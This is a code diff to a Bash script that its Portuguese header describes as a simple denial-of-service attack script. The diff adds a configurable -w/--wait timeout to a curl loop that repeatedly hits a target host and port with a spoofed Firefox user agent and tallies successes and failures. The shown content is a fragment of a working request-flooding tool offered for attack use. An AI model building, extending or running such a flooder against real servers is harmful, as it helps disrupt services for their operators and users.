@@ -6,7 +6,7 @@
 # Data de modificação: 13/10/2024
 # Decription: Simples script de ataque de negação de
 # serviço.
-# Versão: 0.0.1-alpha
+# Versão: 0.4.0-alpha
 # # ================================================
 # Versões:
 # -----------
@@ -56,6 +56,7 @@ temp_file_fa=$(mktemp)
 echo 0 > $temp_file_fa # inicializando temp fa
 temp_file_su=$(mktemp)
 echo 0 > $temp_file_su # inicializa tem su
+tempo_espera=1
 
 # limpa arquivos temporarios
 limpa_tmp(){
@@ -117,7 +118,7 @@ requisitar() {
     local fail=$(cat $temp_file_fa)
     local req=$(cat $temp_file_req)
 
-    curl --silent --max-time 1 -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" "${host}:${port}" &>/dev/null
+    curl --silent --max-time "$tempo_espera" -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" "${host}:${port}" &>/dev/null
     if [[ "$?" -eq "0" ]]; then
 	((sucess++))
 	echo $sucess >$temp_file_su
@@ -182,6 +183,10 @@ menu_check() {
 
     while [[ -n $1 ]]; do
         case "$1" in
+	-w|--wait)
+	    shift
+	    [[ "$1" -ge 1 ]] && tempo_espera="$1"
+	    ;;
 	-p|--port)
 	    shift
 	    [[ "$1" -ge 1  ]] && porta_alvo="$1" 
